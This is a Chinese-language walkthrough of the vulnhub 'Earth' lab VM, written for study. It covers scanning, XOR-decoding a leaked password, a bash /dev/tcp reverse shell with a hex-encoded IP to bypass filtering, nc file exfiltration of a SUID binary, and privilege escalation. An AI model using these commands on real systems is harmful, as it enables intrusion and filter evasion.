前言：

vulnhub打靶系列文章

本次文章只用于技术讨论，学习，切勿用于非法用途，用于非法用途与本人无关！

所有环境均为在线下载的靶场，且在本机进行学习。

首先进行主机的存活探测

一、信息收集

netdiscover -r 192.168.56.0/24

利用nmap对其开放的端口进行扫描探测

nmap -sV -Pn -sC 192.168.56.104

我们将其DNS记录添加进hosts文件中

vim /etc/hosts

接下来对

https://terratest.earth.local/﻿

https://earth.local/进行目录扫描

访问robots.txt

对其后缀进行fuzz，可有

https://terratest.earth.local/testingnotes.txt

对其进行在线翻译可有得到一个用户名terra，且进行xor加密。

py脚本对其进行xor运算，在进行16进制解码即可得到密码

密码：earthclimatechangebad4humans

二、反弹shell

登录后台后发现，一处可有执行命令，尝试反弹shell

但是发现无法反弹shell，靶机做了限制，翻阅了别人的wp，发现可以对ip进行十六进制编码进行绕过（又get到一点）

bash -i >& /dev/tcp/0xc0.0xa8.0x38.0x69/6666 0>&1

但是提权貌似没有可以使用的exp

三、提权

查找一下有权限的命令

find / -perm -u=s -type f 2>/dev/null

直接运行其会报错

CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.

利用nc将其传送至本机kali进行调试

靶机：

nc -nv 192.168.56.105 1234 < /usr/bin/reset_root（kali的ip）

kali：

nc -lp 1234 >reset_root

进行调试：strace ./reset_root

发现其确实这三个文件，因此在nc的shell对其创建再次运行即可

得到其密码Earth
